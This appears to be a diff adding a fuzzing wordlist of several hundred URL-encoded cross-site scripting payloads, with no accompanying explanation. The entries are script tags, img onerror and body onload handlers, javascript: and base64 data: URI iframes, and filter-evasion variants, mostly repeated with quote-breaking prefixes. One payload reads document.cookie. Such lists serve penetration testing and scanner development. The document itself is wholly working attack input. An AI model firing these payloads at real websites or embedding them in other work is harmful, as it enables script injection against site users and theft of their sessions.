+' % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E0
+% 3C ? % 20 foo= % 22 % 3E % 3C script % 3Ejavascript : alert ( 1 ) % 3C/script % 3E
+% 22 % 3E % 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E
+' % 3E % 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E % 22 % 3E
+% 22 % 3E % 3C ? % 20foo= % 22 % 3E % 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E
+' % 3E % 3C ? % 20foo= % 22 % 3E % 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E
+% 3C ! % 20foo= % 22 % 3E % 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E
+% 22 % 3E % 3C ! % 20foo= % 22 % 3E % 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E
+' % 3E % 3C ! % 20foo= % 22 % 3E % 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E
+% 3C/ % 20foo= % 22 % 3E % 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E
+% 22 % 3E % 3C/ % 20foo= % 22 % 3E % 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E
+' % 3E % 3C/ % 20foo= % 22 % 3E % 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E
+' % 3E % 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E ' % 3E % 22 % 3E
+% 3Cimg % 20src/x09=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 22 % 3E % 3Cimg % 20src/x09=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+' % 3E % 3Cimg % 20src/x09=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 3Cimg % 20src/x10=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 22 % 3E % 3Cimg % 20src/x10=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+' % 3E % 3Cimg % 20src/x10=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 3Cimg % 20src/x13=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 22 % 3E % 3Cimg % 20src/x13=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+' % 3E % 3Cimg % 20src/x13=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 3Cimg % 20src/x32=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 22 % 3E % 3Cimg % 20src/x32=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+' % 3E % 3Cimg % 20src/x32=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 3Cimg % 20src/x12=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 22 % 3E % 3Cimg % 20src/x12=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+' % 3E % 3Cimg % 20src/x12=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 3Cimg % 20src/x11=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 22 % 3E % 3Cimg % 20 src/x11=x % 20 onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+' % 3E % 3Cimg % 20 src/x11=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 3Cimg % 20src/x00=x % 20 onerror= % 22 javascript : alert ( 1 ) % 22 % 3E
+% 22 % 3E % 3Cimg % 20src/x00=x % 20 onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+' % 3E % 3Cimg % 20src/x00=x % 20 onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 3C img % 20 src/x47=x % 20onerror= % 22 javascript : alert ( 1 ) % 22 % 3E
+% 22 % 3E % 3Cimg % 20src/x47=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+' % 3E % 3Cimg % 20src/x47=x % 20onerror= % 22javascript : alert ( 1 ) % 22 % 3E
+% 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E
+' % 3E % 3Cscript % 3Ejavascript : alert ( 1 ) % 3C/script % 3E
+% 3CBODY % 20ONLOAD=javascript : alert ( 1 ) % 3E
+% 22 % 3E % 3CBODY % 20ONLOAD=javascript : alert ( 1 ) % 3E
+' % 3E % 3CBODY % 20ONLOAD=javascript : alert ( 1 ) % 3E
+% 3CIFRAME % 20SRC= % 22javascript : javascript : alert ( 1 ) ; % 22 % 3E % 3C/IFRAME % 3E
+% 22 % 3E % 3CIFRAME % 20SRC= % 22javascript : javascript : alert ( 1 ) ; % 22 % 3E % 3C/IFRAME % 3E
+' % 3E % 3CIFRAME % 20SRC= % 22javascript : javascript : alert ( 1 ) ; % 22 % 3E % 3C/IFRAME % 3E
+% 3E % 3C/SCRIPT % 3E % 22 % 3E ' % 3E % 3CSCRIPT % 3Ealert ( String.fromCharCode ( 88,83,83 ) ) % 3C/SCRIPT % 3E
+% 3CIMG % 20 % 22 % 22 % 22 % 3E % 3CSCRIPT % 3Ealert ( % 22X % 22 ) % 3C/SCRIPT % 3E % 22 % 3E
+% 22 % 3E % 3CIMG % 20 % 22 % 22 % 22 % 3E % 3CSCRIPT % 3Ealert ( % 22X % 22 ) % 3C/SCRIPT % 3E % 22 % 3E
+' % 3E % 3CIMG % 20 % 22 % 22 % 22 % 3E % 3CSCRIPT % 3Ealert ( % 22X % 22 ) % 3C/SCRIPT % 3E % 22 % 3E
+% 3C % 3CSCRIPT % 3Ealert ( % 22X % 22 ) ; // % 3C % 3C/SCRIPT % 3E
+% 22 % 3E % 3C % 3CSCRIPT % 3Ealert ( % 22X % 22 ) ; // % 3C % 3C/SCRIPT % 3E
+' % 3E % 3C % 3CSCRIPT % 3Ealert ( % 22X % 22 ) ; // % 3C % 3C/SCRIPT % 3E
+% 3C/TITLE % 3E % 3CSCRIPT % 3Ealert ( % 22X % 22 ) ; % 3C/SCRIPT % 3E
+% 22 % 3E % 3C/TITLE % 3E % 3CSCRIPT % 3Ealert ( % 22X % 22 ) ; % 3C/SCRIPT % 3E
+' % 3E % 3C/TITLE % 3E % 3CSCRIPT % 3Ealert ( % 22X % 22 ) ; % 3C/SCRIPT % 3E
+% 3CBODY % 20ONLOAD=alert ( ' X ' ) % 3E
+% 22 % 3E % 3CBODY % 20ONLOAD=alert ( ' X ' ) % 3E
+' % 3E % 3CBODY % 20ONLOAD=alert ( ' X ' ) % 3E
+% 3CIFRAME % 20SRC= % 22javascript : alert ( ' X ' ) ; % 22 % 3E % 3C/IFRAME % 3E
+% 22 % 3E % 3CIFRAME % 20SRC= % 22javascript : alert ( ' X ' ) ; % 22 % 3E % 3C/IFRAME % 3E
+' % 3E % 3CIFRAME % 20SRC= % 22javascript : alert ( ' X ' ) ; % 22 % 3E % 3C/IFRAME % 3E
+% 3CScRipT % 205-03+9/3= % 3Eprompt ( 1 ) % 3C/ScRipT % 20giveanswerhere= ?
+% 22 % 3E % 3CScRipT % 205-03+9/3= % 3Eprompt ( 1 ) % 3C/ScRipT % 20giveanswerhere= ?
+' % 3E % 3CScRipT % 205-03+9/3= % 3Eprompt ( 1 ) % 3C/ScRipT % 20giveanswerhere= ?
+% 3Ciframe/src= % 22data : text/html ; SPACE base64 SPACE , PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg== % 22 % 3E
+% 22 % 3E % 3Ciframe/src= % 22data : text/html ; SPACE base64 SPACE , PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg== % 22 % 3E
+' % 3E % 3Ciframe/src= % 22data : text/html ; SPACE base64 SPACE , PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg== % 22 % 3E
+% 3Ciframe % 20src=javascript : alert ( document.location ) % 3E
+% 22 % 3E % 3Ciframe % 20src=javascript : alert ( document.location ) % 3E
+' % 3E % 3Ciframe % 20src=javascript : alert ( document.location ) % 3E
+% 3Cscript % 20 % 5E__ % 5E % 3Ealert ( String.fromCharCode ( 49 ) ) % 3C/script % 20 % 5E__ % 5E
+% 22 % 3E % 3Cscript % 20 % 5E__ % 5E % 3Ealert ( String.fromCharCode ( 49 ) ) % 3C/script % 20 % 5E__ % 5E
+' % 3E % 3Cscript % 20 % 5E__ % 5E % 3Ealert ( String.fromCharCode ( 49 ) ) % 3C/script % 20 % 5E__ % 5E
+% 3Ciframe % 20srcdoc= ' < body % 20onload=prompt ( 1 ) > ' % 3E
+% 22 % 3E % 3Ciframe % 20srcdoc= ' < body % 20onload=prompt ( 1 ) > ' % 3E
+' % 3E % 3Ciframe % 20srcdoc= ' < body % 20onload=prompt ( 1 ) > ' % 3E
+/iframe/src/ % 3Ciframe/src= % 22 % 3Ciframe/src= @ % 22/onload=prompt ( 1 ) % 20/iframe/src/ % 3E
+% 3Cimg % 20src= % 22/ % 22 % 20== % 22 % 20title= % 22onerror='prompt ( 1 ) ' % 22 % 3E
+% 22 % 3E % 3Cimg % 20src= % 22/ % 22 % 20== % 22 % 20title= % 22onerror='prompt ( 1 ) ' % 22 % 3E
+' % 3E % 3Cimg % 20src= % 22/ % 22 % 20== % 22 % 20title= % 22onerror='prompt ( 1 ) ' % 22 % 3E
+% 3Cscript % 20src= % 22data : text/javascript , alert ( 1 ) % 22 % 3E % 3C/script % 3E
+% 22 % 3E % 3Cscript % 20src= % 22data : text/javascript , alert ( 1 ) % 22 % 3E % 3C/script % 3E
+' % 3E % 3Cscript % 20src= % 22data : text/javascript , alert ( 1 ) % 22 % 3E % 3C/script % 3E
+http : //www. % 3Cscript % 3Ealert ( 1 ) % 3C/script % 20.com
+% 3Cscript % 3E+-+-1-+-+alert ( 1 ) % 3C/script % 3E
+% 22 % 3E % 3Cscript % 3E+-+-1-+-+alert ( 1 ) % 3C/script % 3E
+' % 3E % 3Cscript % 3E+-+-1-+-+alert ( 1 ) % 3C/script % 3E
+% 3Cscript % 20x % 3E % 20alert ( 1 ) % 20 % 3C/script % 201=2
+% 22 % 3E % 3Cscript % 20x % 3E % 20alert ( 1 ) % 20 % 3C/script % 201=2
+' % 3E % 3Cscript % 20x % 3E % 20alert ( 1 ) % 20 % 3C/script % 201=2
+% 3C -- % 60 % 3Cimg/src= % 60 % 20onerror=alert ( 1 ) % 3E % 20 -- ! % 3E
+% 22 % 3E % 3C -- % 60 % 3Cimg/src= % 60 % 20onerror=alert ( 1 ) % 3E % 20 -- ! % 3E
+' % 3E % 3C -- % 60 % 3Cimg/src= % 60 % 20onerror=alert ( 1 ) % 3E % 20 -- ! % 3E
+% 3Ciframe % 20src= % 22data : text/html , % 3Cscript % 3Ealert % 281 % 29 % 3C % 2Fscript % 3E % 22 % 3E % 3C/iframe % 3E
+% 22 % 3E % 3Ciframe % 20src= % 22data : text/html , % 3Cscript % 3Ealert % 281 % 29 % 3C % 2Fscript % 3E % 22 % 3E % 3C/iframe % 3E
+' % 3E % 3Ciframe % 20src= % 22data : text/html , % 3Cscript % 3Ealert % 281 % 29 % 3C % 2Fscript % 3E % 22 % 3E % 3C/iframe % 3E
+% 3Cscript % 3Ealert ( 1 ) % 3C ! -- % 20 ' % 3C/script % 3E
+% 22 % 3E % 3Cscript % 3Ealert ( 1 ) % 3C ! -- % 20 ' % 3C/script % 3E
+' % 3E % 3Cscript % 3Ealert ( 1 ) % 3C ! -- % 20 ' % 3C/script % 3E
+% 3Cscript % 3E % 20var % 20a % 20= % 20 % 22X % 22 ; % 20alert ( 1 ) ; % 20 % 3C/script % 3E
+% 22 % 3E % 3Cscript % 3E % 20var % 20a % 20= % 20 % 22X % 22 ; % 20alert ( 1 ) ; % 20 % 3C/script % 3E
+' % 3E % 3Cscript % 3E % 20var % 20a % 20= % 20 % 22X % 22 ; % 20alert ( 1 ) ; % 20 % 3C/script % 3E
+% 3Cscript % 3E % 20var % 20x % 20= % 20 % 22X/ % 22 ; % 20alert ( 1 ) ; % 20 % 3C/script % 3E
+% 22 % 3E % 3Cscript % 3E % 20var % 20x % 20= % 20 % 22X/ % 22 ; % 20alert ( 1 ) ; % 20 % 3C/script % 3E
+' % 3E % 3Cscript % 3E % 20var % 20x % 20= % 20 % 22X/ % 22 ; % 20alert ( 1 ) ; % 20 % 3C/script % 3E
+% 3Cimg % 20src= % 221 % 22 % 20onerror= % 22alert ( 1 ) % 22 % 3E
+% 22 % 3E % 3Cimg % 20src= % 221 % 22 % 20onerror= % 22alert ( 1 ) % 22 % 3E
+' % 3E % 3Cimg % 20src= % 221 % 22 % 20onerror= % 22alert ( 1 ) % 22 % 3E
+% 3Cscript % 3E % 20function % 20a ( ) % 20 % 7B % 7D % 20 % 3C/script % 3E % 20 % 3Cimg % 20src=1 % 20onerror= % 22a ( ) ; alert ( 1 ) % 22 % 3E
+% 22 % 3E % 3Cscript % 3E % 20function % 20a ( ) % 20 % 7B % 7D % 20 % 3C/script % 3E % 20 % 3Cimg % 20src=1 % 20onerror= % 22a ( ) ; alert ( 1 ) % 22 % 3E
+' % 3E % 3Cscript % 3E % 20function % 20a ( ) % 20 % 7B % 7D % 20 % 3C/script % 3E % 20 % 3Cimg % 20src=1 % 20onerror= % 22a ( ) ; alert ( 1 ) % 22 % 3E
+% 3Cimg % 20src=1 % 20onerror= % 22alert ( 1 ) % 22 % 3E
+% 22 % 3E % 3Cimg % 20src=1 % 20onerror= % 22alert ( 1 ) % 22 % 3E
+' % 3E % 3Cimg % 20src=1 % 20onerror= % 22alert ( 1 ) % 22 % 3E
+% 3Cscript % 3E % 20var % 20x % 20= % 20 % 22asdf/1 % 20asdf % 22 ; % 20alert ( 1 ) ; % 20 % 3C/script % 3E
+% 22 % 3E % 3Cscript % 3E % 20var % 20x % 20= % 20 % 22asdf/1 % 20asdf % 22 ; % 20alert ( 1 ) ; % 20 % 3C/script % 3E
+' % 3E % 3Cscript % 3E % 20var % 20x % 20= % 20 % 22asdf/1 % 20asdf % 22 ; % 20alert ( 1 ) ; % 20 % 3C/script % 3E
+% 3Csvg % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E
+% 3Cimg % 20src=xx : xx % 20onerror=alert ( 1 ) % 3E
+% 22 % 3E % 3Cimg % 20src=xx : xx % 20onerror=alert ( 1 ) % 3E
+' % 3E % 3Cimg % 20src=xx : xx % 20onerror=alert ( 1 ) % 3E
+% 3Cimg % 20src=xx : xx % 20onerror % 20=alert ( 1 ) ; % 3E
+% 22 % 3E % 3Cimg % 20src=xx : xx % 20onerror % 20=alert ( 1 ) ; % 3E
+' % 3E % 3Cimg % 20src=xx : xx % 20onerror % 20=alert ( 1 ) ; % 3E
+% 3Cscript % 3E % 20document.cookie= ' X ' ; % 20if ( document.cookie % 20 ! == % 20 ' X ' ) % 20 % 7B % 20alert ( 1 , document.cookie ) ; % 20 % 7D % 20 % 3C/script % 3E
+% 22 % 3E % 3Cscript % 3E % 20document.cookie= ' X ' ; % 20if ( document.cookie % 20 ! == % 20 ' X ' ) % 20 % 7B % 20alert ( 1 , document.cookie ) ; % 20 % 7D % 20 % 3C/script % 3E
+' % 3E % 3Cscript % 3E % 20document.cookie= ' X ' ; % 20if ( document.cookie % 20 ! == % 20 ' X ' ) % 20 % 7B % 20alert ( 1 , document.cookie ) ; % 20 % 7D % 20 % 3C/script % 3E
+% 3Cimg % 20src=x : xx % 20onerror= % 22try % 20 % 7BexecScript ( ' a=1 ' , 'vbs ' ) ; alert ( 1 ) ; % 7Dcatch ( e ) % 7Balert ( 1 ) ; % 7D % 22 % 3E
+% 22 % 3E % 3Cimg % 20src=x : xx % 20onerror= % 22try % 20 % 7BexecScript ( ' a=1 ' , 'vbs ' ) ; alert ( 1 ) ; % 7Dcatch ( e ) % 7Balert ( 1 ) ; % 7D % 22 % 3E
+' % 3E % 3Cimg % 20src=x : xx % 20onerror= % 22try % 20 % 7BexecScript ( ' a=1 ' , 'vbs ' ) ; alert ( 1 ) ; % 7Dcatch ( e ) % 7Balert ( 1 ) ; % 7D % 22 % 3E
+% 3Cimg % 20src=xx : xx % 20onerror= % 22x='/ ' , alert ( 1 ) // ' % 22 % 3E
+% 22 % 3E % 3Cimg % 20src=xx : xx % 20onerror= % 22x='/ ' , alert ( 1 ) // ' % 22 % 3E
+' % 3E % 3Cimg % 20src=xx : xx % 20onerror= % 22x='/ ' , alert ( 1 ) // ' % 22 % 3E
+% 3Cscript % 3Ealert ( alert ( 1 ) ) % 3C/script % 3E
+' % 3E % 3Cscript % 3Ealert ( alert ( 1 ) ) % 3C/script % 3E
+' % 3E % 3Cimg % 20src=xx : xx % 20onerror=alert ( 1 ) % 3E ' ; % 3C/script % 3E
+-- % 3E % 3Cimg % 20src=xxx : x % 20onerror=alert ( 1 ) % 3E % 20 -- % 3E
+' % 3E % 3Cimg % 20src=xx : xx % 20onerror=alert ( 1 ) % 3E % 20 % 3Ca % 20href=javascript : alert ( 1 ) % 3E1 % 3C/a % 3E
+% 22 % 3E % 3Cimg % 20src=xx : xx % 20onerror=alert ( 1 ) % 3E % 20 % 3Ca % 20href=javascript : alert ( 1 ) % 3E1 % 3C/a % 3E
+% 3Cbody % 3E % 20 % C2 % A7iframe % 20onload=confirm ( /X/ ) > % 20 % 3Cimg % 20src=x : x % 20onerror= % 22innerHTML=previousSibling.nodeValue.replace ( ' % C2 % A7 ' , ' % 3C ' ) % 22 % 3E % 20 % 3C/body % 3E
+% 22 % 3E % 3Cbody % 3E % 20 % C2 % A7iframe % 20onload=confirm ( /X/ ) > % 20 % 3Cimg % 20src=x : x % 20onerror= % 22innerHTML=previousSibling.nodeValue.replace ( ' % C2 % A7 ' , ' % 3C ' ) % 22 % 3E % 20 % 3C/body % 3E
+' % 3E % 3Cbody % 3E % 20 % C2 % A7iframe % 20onload=confirm ( /X/ ) > % 20 % 3Cimg % 20src=x : x % 20onerror= % 22innerHTML=previousSibling.nodeValue.replace ( ' % C2 % A7 ' , ' % 3C ' ) % 22 % 3E % 20 % 3C/body % 3E
+% 3Cb % 20id= % 22id1 % 22 % 20x=begin0x9fa0end % 20 % 3E % 60 ' % 22 % 3E % 3C/b % 3E % 3Cscript % 3Eif % 20 ( ! /begin.end/.test ( document.getElementById ( 'id1 ' ) .getAttribute ( ' x ' ) ) ) % 20 % 7B % 20alert ( 1 ) ; % 7D % 3C/script % 3E
+% 22 % 3E % 3Cb % 20id= % 22id1 % 22 % 20x=begin0x9fa0end % 20 % 3E % 60 ' % 22 % 3E % 3C/b % 3E % 3Cscript % 3Eif % 20 ( ! /begin.end/.test ( document.getElementById ( 'id1 ' ) .getAttribute ( ' x ' ) ) ) % 20 % 7B % 20alert ( 1 ) ; % 7D % 3C/script % 3E
+' % 3E % 3Cb % 20id= % 22id1 % 22 % 20x=begin0x9fa0end % 20 % 3E % 60 ' % 22 % 3E % 3C/b % 3E % 3Cscript % 3Eif % 20 ( ! /begin.end/.test ( document.getElementById ( 'id1 ' ) .getAttribute ( ' x ' ) ) ) % 20 % 7B % 20alert ( 1 ) ; % 7D % 3C/script % 3E
+% 3Cb % 20id= % 22id1 % 22 % 20x=begin0x2924end % 20 % 3E % 60 ' % 22 % 3E % 3C/b % 3E % 3Cscript % 3Eif % 20 ( ! /begin.end/.test ( document.getElementById ( 'id1 ' ) .getAttribute ( ' x ' ) ) ) % 20 % 7B % 20alert ( 1 ) ; % 7D % 3C/script % 3E
+% 22 % 3E % 3Cb % 20id= % 22id1 % 22 % 20x=begin0x2924end % 20 % 3E % 60 ' % 22 % 3E % 3C/b % 3E % 3Cscript % 3Eif % 20 ( ! /begin.end/.test ( document.getElementById ( 'id1 ' ) .getAttribute ( ' x ' ) ) ) % 20 % 7B % 20alert ( 1 ) ; % 7D % 3C/script % 3E
+' % 3E % 3Cb % 20id= % 22id1 % 22 % 20x=begin0x2924end % 20 % 3E % 60 ' % 22 % 3E % 3C/b % 3E % 3Cscript % 3Eif % 20 ( ! /begin.end/.test ( document.getElementById ( 'id1 ' ) .getAttribute ( ' x ' ) ) ) % 20 % 7B % 20alert ( 1 ) ; % 7D % 3C/script % 3E
+' % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E % 3C/title % 3E
+% 3Cscript % 3Eif ( % 22x/ % 22.length==2 ) % 20 % 7B % 20alert ( 1 ) ; % 7D % 3C/script % 3E
+% 22 % 3E % 3Cscript % 3Eif ( % 22x/ % 22.length==2 ) % 20 % 7B % 20alert ( 1 ) ; % 7D % 3C/script % 3E
+' % 3E % 3Cscript % 3Eif ( % 22x/ % 22.length==2 ) % 20 % 7B % 20alert ( 1 ) ; % 7D % 3C/script % 3E
+% 3Cscript % 3Eif ( % 22xx % 22 % 20== % 20 % 22xx % 22 ) % 20 % 7B % 20alert ( 1 ) ; % 7D % 3C/script % 3E
+% 22 % 3E % 3Cscript % 3Eif ( % 22xx % 22 % 20== % 20 % 22xx % 22 ) % 20 % 7B % 20alert ( 1 ) ; % 7D % 3C/script % 3E
+' % 3E % 3Cscript % 3Eif ( % 22xx % 22 % 20== % 20 % 22xx % 22 ) % 20 % 7B % 20alert ( 1 ) ; % 7D % 3C/script % 3E
+% 3Cimg % 20src=x % 20onError= % 22javascript : alert ( 1 ) % 22/ % 3E
+' % 3E % 3Cscript % 20type= % 22text/javascript % 22 % 3Ealert ( 1 ) ; % 3C/script % 3E
+% 3Cscript % 20charset='utf-8 ' % 3Ealert ( 1 ) % 3C/script % 3E
+% 22 % 3E % 3Cscript % 20charset='utf-8 ' % 3Ealert ( 1 ) % 3C/script % 3E
+' % 3E % 3Cscript % 20charset='utf-8 ' % 3Ealert ( 1 ) % 3C/script % 3E
+% 3Cstyle % 3E % 3C/style % 3E % 3Cimg % 20src= % 22about : blank % 22 % 20onerror=alert ( 1 ) // % 3E % 3C/style % 3E
+% 22 % 3E % 3Cstyle % 3E % 3C/style % 3E % 3Cimg % 20src= % 22about : blank % 22 % 20onerror=alert ( 1 ) // % 3E % 3C/style % 3E
+' % 3E % 3Cstyle % 3E % 3C/style % 3E % 3Cimg % 20src= % 22about : blank % 22 % 20onerror=alert ( 1 ) // % 3E % 3C/style % 3E
+% 3Cscript % 3Ea= ' X// ' ; alert ( 1 ) //X ' ; % 3C/script % 3E
+% 22 % 3E % 3Cscript % 3Ea= ' X// ' ; alert ( 1 ) //X ' ; % 3C/script % 3E
+' % 3E % 3Cscript % 3Ea= ' X// ' ; alert ( 1 ) //X ' ; % 3C/script % 3E
+% 3Cscript % 3Etry % 7Beval ( % 22 % 3C % 3E % 3C/ % 3E % 22 ) ; alert ( 1 ) % 7Dcatch ( e ) % 7Balert ( 1 ) % 7D ; % 3C/script % 3E
+% 22 % 3E % 3Cscript % 3Etry % 7Beval ( % 22 % 3C % 3E % 3C/ % 3E % 22 ) ; alert ( 1 ) % 7Dcatch ( e ) % 7Balert ( 1 ) % 7D ; % 3C/script % 3E
+' % 3E % 3Cscript % 3Etry % 7Beval ( % 22 % 3C % 3E % 3C/ % 3E % 22 ) ; alert ( 1 ) % 7Dcatch ( e ) % 7Balert ( 1 ) % 7D ; % 3C/script % 3E
+% 3Cdiv % 20class= % 22foo1 % 22 % 3EX % 3C/div % 3E % 20 % 3Cscript % 3Edocument.getElementsByClassName ( 'foo1 ' ) [ 0 ] ? alert ( 1 ) :0 % 3C/script % 3E
+% 22 % 3E % 3Cdiv % 20class= % 22foo1 % 22 % 3EX % 3C/div % 3E % 20 % 3Cscript % 3Edocument.getElementsByClassName ( 'foo1 ' ) [ 0 ] ? alert ( 1 ) :0 % 3C/script % 3E
+' % 3E % 3Cdiv % 20class= % 22foo1 % 22 % 3EX % 3C/div % 3E % 20 % 3Cscript % 3Edocument.getElementsByClassName ( 'foo1 ' ) [ 0 ] ? alert ( 1 ) :0 % 3C/script % 3E
+' % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E % 22 % 20/ % 3E
+% 3Cp % 3E % 3Csvg % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E
+' % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E % 3C/p % 3E
+% 3Cscript % 20src= % 22data : ,alert ( 1 ) % 22 % 3E % 3C/script % 3E
+% 22 % 3E % 3Cscript % 20src= % 22data : ,alert ( 1 ) % 22 % 3E % 3C/script % 3E
+' % 3E % 3Cscript % 20src= % 22data : ,alert ( 1 ) % 22 % 3E % 3C/script % 3E
+% 3Cscript % 20src= % 22data : text/plain , alert ( 1 ) % 22 % 3E % 3C/script % 3E
+% 22 % 3E % 3Cscript % 20src= % 22data : text/plain , alert ( 1 ) % 22 % 3E % 3C/script % 3E
+' % 3E % 3Cscript % 20src= % 22data : text/plain , alert ( 1 ) % 22 % 3E % 3C/script % 3E
+% 22 ' % 60 % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E
+% 22 ' % 60 % 3E % 3Cimg % 20src=xxx : x % 20onerror=alert ( 1 ) % 3E
+' % 60 % 22 % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E
+% 60 % 22 ' % 3E % 3Cimg % 20src=xxx : x % 20onerror=alert ( 1 ) % 3E
+% 3Cinput % 20id= ' 1 ' % 3E % 3Cinput % 20id=1 % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E
+% 22 % 3E % 3Cinput % 20id= ' 1 ' % 3E % 3Cinput % 20id=1 % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E
+' % 3E % 3Cinput % 20id= ' 1 ' % 3E % 3Cinput % 20id=1 % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E
+% 3Ca % 20href= % 22invalid:1 % 22 % 20id=x % 20name=y % 3EX % 3C/a % 3E % 3Ca % 20href= % 22invalid:2 % 22 % 20id=x % 20name=y % 3EX % 3C/a % 3E % 3Cscript % 3Ealert ( x.y [ 0 ] ) % 3C/script % 3E
+% 22 % 3E % 3Ca % 20href= % 22invalid:1 % 22 % 20id=x % 20name=y % 3EX % 3C/a % 3E % 3Ca % 20href= % 22invalid:2 % 22 % 20id=x % 20name=y % 3EX % 3C/a % 3E % 3Cscript % 3Ealert ( x.y [ 0 ] ) % 3C/script % 3E
+' % 3E % 3Ca % 20href= % 22invalid:1 % 22 % 20id=x % 20name=y % 3EX % 3C/a % 3E % 3Ca % 20href= % 22invalid:2 % 22 % 20id=x % 20name=y % 3EX % 3C/a % 3E % 3Cscript % 3Ealert ( x.y [ 0 ] ) % 3C/script % 3E
+% E0 % 3Cbody % 20onload=alert ( 1 ) % 3E
+% 3Cscript % 3Ealert ( 1 ) % 3B % 3C % 2Fscript % 3E
+% 22 % 3E % 3Cscript % 3Ealert ( 1 ) % 3B % 3C % 2Fscript % 3E
+X % 20- % 22 % 3E % 3Cscript % 3Ealert ( 1 ) % 3C % 2Fscript % 3E
+X % 20 % 3Cscript % 3Ealert ( 1 ) % 3B % 3C % 2Fscript % 3E
+% 3CSCRIPT % 3Ealert ( 1 ) ; % 3C/SCRIPT % 3E
+' % 3E % 3Cimg % 20src=a % 20onerror=alert ( 1 ) % 20 % 0A % 3E
+% 22 % 3E % 3Cimg % 20src=a % 20onerror=alert ( 1 ) % 20 % 0A % 3E
+' % 3E % 3Cscript % 3Ealert ( 1 ) % 3C/script % 3E % 22 % 3E1 % 3C/aside % 3E
+% 3Ciframe/src= % 22data : text/html ; SPACE base64 SPACE , PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg== % 22 % 3E
+% 22 % 3E % 3Ciframe/src= % 22data : text/html ; SPACE base64 SPACE , PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg== % 22 % 3E
+' % 3E % 3Ciframe/src= % 22data : text/html ; SPACE base64 SPACE , PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg== % 22 % 3E
+% 3Cimg % 20src=x % 20onerror=confirm ( /X/ ) % 3E
+% 22 % 3E % 3Cimg % 20src=x % 20onerror=confirm ( /X/ ) % 3E
+' % 3E % 3Cimg % 20src=x % 20onerror=confirm ( /X/ ) % 3E
+% 22 % 3E % 3Cimg % 20src=x % 20onerror=confirm ( 1 ) ; % 3E
+% 3Cimg/src=x % 20alt=confirm ( 1 ) % 20onerror=eval ( alt ) % 3E
+% 22 % 3E % 3Cimg/src=x % 20alt=confirm ( 1 ) % 20onerror=eval ( alt ) % 3E
+' % 3E % 3Cimg/src=x % 20alt=confirm ( 1 ) % 20onerror=eval ( alt ) % 3E
+% 3Cimg % 20src=x % 20onerror=alert ( 1 ) // % 3E
+% 22 % 3E % 3Cimg % 20src=x % 20onerror=alert ( 1 ) // % 3E
+' % 3E % 3Cimg % 20src=x % 20onerror=alert ( 1 ) // % 3E
+% 3Clisting % 3E < img % 20onerror= % 22alert ( 1 ) ; // % 22 % 20src=1 > % 3Ct % 20t % 3E % 3C/listing % 3E
+% 22 % 3E % 3Clisting % 3E < img % 20onerror= % 22alert ( 1 ) ; // % 22 % 20src=1 > % 3Ct % 20t % 3E % 3C/listing % 3E
+' % 3E % 3Clisting % 3E < img % 20onerror= % 22alert ( 1 ) ; // % 22 % 20src=1 > % 3Ct % 20t % 3E % 3C/listing % 3E
+% 3Cimg % 20src=x % 20id/= ' % 20onerror=alert ( 1 ) // ' % 3E
+% 22 % 3E % 3Cimg % 20src=x % 20id/= ' % 20onerror=alert ( 1 ) // ' % 3E
+' % 3E % 3Cimg % 20src=x % 20id/= ' % 20onerror=alert ( 1 ) // ' % 3E
+% 3Cb % 3E % 3Cnoscript % 3E % 3C ! -- % 20 % 3C/noscript % 3E % 3Cimg % 20src=xx : % 20onerror=alert ( 1 ) % 20 -- % 3E % 3C/noscript % 3E
